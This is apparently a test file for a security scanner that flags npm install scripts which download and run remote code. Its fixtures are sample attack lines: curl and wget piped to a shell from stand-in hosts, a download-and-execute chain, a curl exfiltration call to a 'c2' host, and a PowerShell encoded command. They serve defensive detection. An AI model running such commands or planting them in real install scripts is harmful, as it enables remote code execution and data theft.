import { describe, it } from 'node:test';
import * as assert from 'node:assert/strict';
import { analyzeRemoteExec } from '../../../src/analysis/analyzers/remote-exec.js';
import type { AnalysisContext } from '../../../src/analysis/types.js';
import type { Packument } from '../../../src/registry/types.js';

const EMPTY_PACKUMENT: Packument = {
  name: 'test-pkg',
  'dist-tags': { latest: '1.0.0' },
  versions: {},
  time: {},
  maintainers: [],
};

function makeContext(source: string): AnalysisContext {
  return {
    packageName: 'test-pkg',
    version: '1.0.0',
    extractedPath: '/tmp/fake',
    allFiles: [],
    installScripts: [
      {
        lifecycle: 'postinstall',
        command: 'node install.js',
        resolvedFile: '/tmp/fake/package/install.js',
        source,
      },
    ],
    packument: EMPTY_PACKUMENT,
  };
}

describe('analyzeRemoteExec', () => {
  it('detects curl | bash pattern as critical', () => {
    const findings = analyzeRemoteExec(makeContext(
      `exec('curl https://attacker.io/payload | bash')`
    ));
    assert.ok(findings.some((f) => f.category === 'install-script-remote-exec' && f.level === 'critical'));
  });

  it('detects wget | sh pattern as critical', () => {
    const findings = analyzeRemoteExec(makeContext(
      `execSync('wget -O- https://evil.io/script.sh | sh')`
    ));
    assert.ok(findings.some((f) => f.category === 'install-script-remote-exec' && f.level === 'critical'));
  });

  it('detects curl with URL without pipe as critical', () => {
    const findings = analyzeRemoteExec(makeContext(
      `exec('curl -o /tmp/payload https://attacker.io/malware && chmod +x /tmp/payload && /tmp/payload')`
    ));
    assert.ok(findings.some((f) => f.category === 'install-script-remote-exec' && f.level === 'critical'));
  });

  it('detects member exec call: cp.execSync with curl', () => {
    const findings = analyzeRemoteExec(makeContext(
      `cp.execSync('curl https://c2.evil.io/exfil?data=' + data)`
    ));
    assert.ok(findings.some((f) => f.category === 'install-script-remote-exec'));
  });

  it('detects PowerShell encoded command as critical', () => {
    const findings = analyzeRemoteExec(makeContext(
      `exec('powershell -EncodedCommand aGVsbG8=')`
    ));
    assert.ok(findings.some((f) => f.category === 'install-script-remote-exec' && f.level === 'critical'));
  });

  it('detects wget without pipe as critical (has URL)', () => {
    const findings = analyzeRemoteExec(makeContext(
      `execSync('wget https://evil.io/backdoor -O /usr/local/bin/helper')`
    ));
    assert.ok(findings.some((f) => f.category === 'install-script-remote-exec' && f.level === 'critical'));
  });

  it('does not flag exec calls without download tools', () => {
    const findings = analyzeRemoteExec(makeContext(
      `exec('node build.js --production')`
    ));
    assert.equal(findings.length, 0);
  });

  it('does not flag scripts with no exec calls', () => {
    const findings = analyzeRemoteExec(makeContext(
      `console.log('build complete')`
    ));
    assert.equal(findings.length, 0);
  });
});
